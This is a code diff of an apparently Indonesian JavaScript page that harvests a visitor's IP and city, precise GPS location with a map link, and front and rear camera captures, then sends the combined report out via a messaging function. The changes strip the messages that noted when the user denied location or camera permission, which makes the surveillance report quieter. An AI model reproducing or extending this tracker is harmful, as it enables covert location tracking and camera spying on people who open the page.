@@ -288,7 +288,7 @@ Kota                : ${ip.city}`.trim();
           const { latitude, longitude, accuracy } = pos.coords;
           resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);
         }, () => {
-          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
+          resolve(``);
         }, { enableHighAccuracy: true, timeout: 5000 });
       });
     };
@@ -336,10 +336,10 @@ Kota                : ${ip.city}`.trim();
       const depan = await ambilKamera("user");
       const belakang = await ambilKamera("environment");
 
-      const kameraDepanStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡 〙 ౼\n\n${depan ? '✅ Kamera berhasil diakses' : '❌ Kamera tidak diizinkan oleh pengguna.'}`;
-      const kameraBelakangStatus = `౼ 〘 𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚 〙 ౼\n\n${belakang ? '✅ Kamera berhasil diakses' : '❌ Kamera tidak diizinkan oleh pengguna.'}`;
+      const kameraDepanStatus = '';
+      const kameraBelakangStatus = '';
 
-      const gabungSemua = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].join('\n\n');
+      const gabungSemua = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].filter(Boolean).join('\n\n');
       await kirimPesan(gabungSemua);
     };
 
